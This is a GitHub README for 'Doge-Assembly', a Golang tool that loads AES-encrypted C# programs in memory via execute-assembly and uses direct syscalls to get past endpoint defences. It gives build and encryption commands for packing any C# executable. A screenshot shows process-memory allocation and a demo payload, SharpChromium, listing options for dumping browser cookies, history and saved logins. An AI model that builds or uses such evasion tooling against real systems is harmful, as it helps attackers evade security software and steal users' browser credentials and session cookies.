![Doge-Assembly](https://socialify.git.ci/timwhitez/Doge-Assembly/image?description=1&font=Raleway&forks=1&issues=1&language=1&logo=https%3A%2F%2Favatars1.githubusercontent.com%2Fu%2F36320909&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

- 🐸Frog For Automatic Scan

- 🐶Doge For Defense Evasion&Offensive Security

# Doge-Assembly
Golang evasion tools, use execute-assembly to excute C# tools

## Intro
Are you still worrying about defense evasion?


## feature
使用Golang execute assembly加载C#程序

C#程序编译为静态资源文件，使用AES加密，使用时最好替换自定义密钥

clr.dll进程注入的过程采用direct syscall进行api调用

写的较为仓促，希望有大佬帮忙优化


## Usage

```
cd encrypt
go build

you can change sharp.exe to your own C# exe file

./encrypt.exe ./sharp.exe

copy sharp.exe.cipher to bin/

cd ..
go-bindata data/
go build

```

```
demo sharp.exe is SharpChromium.exe
```


## ref
资源文件加载:

- https://github.com/go-bindata/go-bindata

golang 的 execute assembly 实现:

- https://github.com/lesnuages/go-execute-assembly

bananaphone, golang hells gate:

- https://github.com/C-Sto/BananaPhone


## screenshot
```
PS D:\Doge-Assembly> .\Doge-Assembly.exe
Decrypt Success...

dll: 19968
bin: 584704

Dynamic Evasion
Please Wait for 10 seconds......
2481571495936
BananaPhone: Allocated 20480bytes at 0x241C9300000
BananaPhone: Wrote 20480bytes at 0x241C9300000
2481571561472
BananaPhone: Allocated 585728bytes at 0x241C9310000
BananaPhone: Wrote 584715bytes at 0x241C9310000
2021/03/09 16:37:29 Got thread handle: 404

out:
[X] Invalid argument passed:

Usage:
    .\SharpChromium.exe arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chromium Cookies, History and Logins.
    full      - The same as 'all'
    logins    - Retrieve all saved credentials that have non-empty passwords.
    history   - Retrieve user's history with a count of each time the URL was
                visited, along with cookies matching those items.
    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
                                        If domains are passed, then return only
                                        cookies matching those domains. Otherwise,
                                        all cookies are saved into a temp file of
                                        the format "%TEMP%\$browser-cookies.json"


err:

```

# 🚀Star Trend
[![Stargazers over time](https://starchart.cc/timwhitez/Doge-Assembly.svg)](https://starchart.cc/timwhitez/Doge-Assembly)
